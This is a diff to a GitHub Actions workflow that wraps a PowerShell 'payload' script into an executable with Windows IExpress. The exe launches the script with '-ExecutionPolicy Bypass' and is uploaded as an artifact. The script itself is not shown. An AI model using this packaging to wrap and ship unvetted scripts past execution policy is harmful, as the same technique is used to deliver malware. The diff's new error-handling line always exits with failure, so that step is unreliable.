@@ -16,6 +16,10 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
+    - name: Check IExpress Availability
+      shell: cmd
+      run: where iexpress || echo "IExpress not found!"
+
     - name: Fetch Payload Script
       shell: powershell
       run: |
@@ -41,7 +45,7 @@ jobs:
         InstallPrompt=
         DisplayLicense=
         FinishMessage=
-        TargetName=payload.exe
+        TargetName=C:\Users\runneradmin\payload.exe
         FriendlyName=PowerShell Payload
         AppLaunched=powershell.exe -ExecutionPolicy Bypass -File payload.ps1
         PostInstallCmd=<None>
@@ -58,7 +62,7 @@ jobs:
     - name: Run IExpress
       shell: cmd
       run: |
-        iexpress /N /Q package.sed > iexpress_log.txt 2>&1 || exit 1
+        iexpress /N /Q package.sed || echo "IExpress failed!" && exit 1
 
     - name: Upload IExpress Log
       uses: actions/upload-artifact@v4
@@ -70,6 +74,7 @@ jobs:
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
-        path: payload.exe
+        path: C:\Users\runneradmin\payload.exe
+
 
 
